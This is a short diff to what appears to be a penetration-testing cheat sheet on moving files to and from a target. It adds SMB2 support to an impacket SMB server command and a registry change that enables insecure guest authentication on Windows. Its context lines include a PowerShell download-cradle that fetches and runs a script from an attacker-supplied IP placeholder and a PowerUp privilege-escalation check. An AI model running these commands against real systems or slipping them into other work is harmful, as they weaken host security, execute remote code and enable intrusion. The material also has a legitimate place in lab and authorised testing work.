@@ -1534,7 +1534,7 @@ sudo systemctl start apache2
 sudo service pure-ftpd
 
 # SMB SHARE
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./   
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./ -smb2support 
 
 # {PORT}: Port to open for file transfer
 ```
@@ -1568,6 +1568,7 @@ IEX(New-Object Net.WebClient).downloadstring("http://{IP ADDRESS}/{FILE}")
 Invoke-AllChecks
 
 # SMB SHARE UPLOAD FILE
+REG ADD HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f
 copy \\{IP ADDRESS}\share\{FILE}
 
 # SMB SHARE DOWNLAOD FILE
